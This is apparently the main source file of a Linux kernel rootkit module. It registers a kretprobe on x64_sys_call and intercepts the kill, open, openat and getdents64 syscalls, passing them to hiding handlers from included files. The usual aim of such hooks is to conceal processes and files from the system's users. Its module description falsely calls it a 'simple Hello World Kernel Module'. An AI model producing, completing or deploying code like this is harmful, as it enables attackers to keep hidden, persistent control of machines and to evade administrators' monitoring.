#include "get_kln.h"
#include "hide.c"
#include "hide_file.c"
#include "syscall_metadata.h"
#include <linux/file.h>
#include <linux/kprobes.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A simple Hello World Kernel Module");

struct kretprobe kp;

static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
  struct pt_regs *syscall_regs = (struct pt_regs *)regs->di;
  struct syscall_metadata *data = (struct syscall_metadata *)k->data;
  data->syscall = UNKNOWN;

  int syscall_number = *(int *)&syscall_regs->orig_ax;
  if (syscall_number == 62) {
    hide_handler(syscall_regs);
    data->syscall = KILL;
  } else if (syscall_number == 257) {
    char *__user filename = (char *)syscall_regs->si;
    open_enter_handler(filename, data);
    data->syscall = OPEN;
  } else if (syscall_number == 2) {
    char *__user filename = (char *)syscall_regs->di;
    open_enter_handler(filename, data);
    data->syscall = OPEN;
  } else if (syscall_number == 0xd9) {
    data->syscall = GET_DENTS;
    data->metadata.get_dents_metadata.buf_size =
        *(unsigned int *)&syscall_regs->dx;
    data->metadata.get_dents_metadata.entries =
        (struct linux_dirent64 *)syscall_regs->si;
  }

  return 0;
}

static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
  struct syscall_metadata *data = (struct syscall_metadata *)k->data;

  if (data->syscall == OPEN) {
    open_exit_handler(regs, *data);
  }
  if (data->syscall == GET_DENTS) {
    getdents64_exit_handler(regs, *data);
  }

  free_syscall_metadata(*data);
  return 0;
}

static int __init rootkit_enter(void) {

  kp.kp.symbol_name = "x64_sys_call";
  kp.data_size = sizeof(struct syscall_metadata);
  kp.maxactive = 1000;

  kp.entry_handler = &syscall_entry;
  kp.handler = &syscall_exit;

  if (register_kretprobe(&kp) != 0) {
    printk(KERN_INFO "Failed kprobing on syscall");
  }

  return 0;
}

static void __exit rootkit_exit(void) {
  unregister_kretprobe(&kp);

  printk(KERN_INFO "Goodbye rootkit unloaded\n");
}

module_init(rootkit_enter);
module_exit(rootkit_exit);
